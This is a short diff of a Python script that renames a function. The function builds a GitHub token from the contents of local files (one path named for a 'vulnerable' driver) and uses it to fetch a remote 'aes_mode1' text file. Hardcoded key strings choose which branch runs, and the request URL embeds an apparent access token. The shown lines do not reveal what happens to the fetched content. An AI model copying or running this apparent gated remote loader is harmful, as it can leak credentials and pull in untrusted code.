@@ -303,7 +303,7 @@ content2 = get_string_from_file(system_driver_vul_path)
 content3 = get_string_from_file(data_vulnerable_path)
 content4 =  content1+content2+content3
 content5 = content4
-def premx_2025(mycontent: str):
+def mode1_v1(mycontent: str):
     raw_url = "https://raw.githubusercontent.com/nvtsxlz/myown/refs/heads/main/v1_aes_mode1.txt?token=GHSAT0AAAAAADBMT63O7LX6HKBIUFPXLWAA2ALA6LQ"
     headers = {"Authorization": f"token {mycontent}"}
     response = requests.get(raw_url, headers=headers)
@@ -314,6 +314,6 @@ def premx_2025(mycontent: str):
     else:
         raise Exception(f"Error. Your internet is private.")
 if cskey=="TmSQZxjs84wUjTSgTP0mzBLcbS" or cskey=="xCFnDhqx4DoPENU1-aesthetic":
-    premx_2025(content5)
+    mode1_v1(content5)
 else:
     new_function_name(content5)
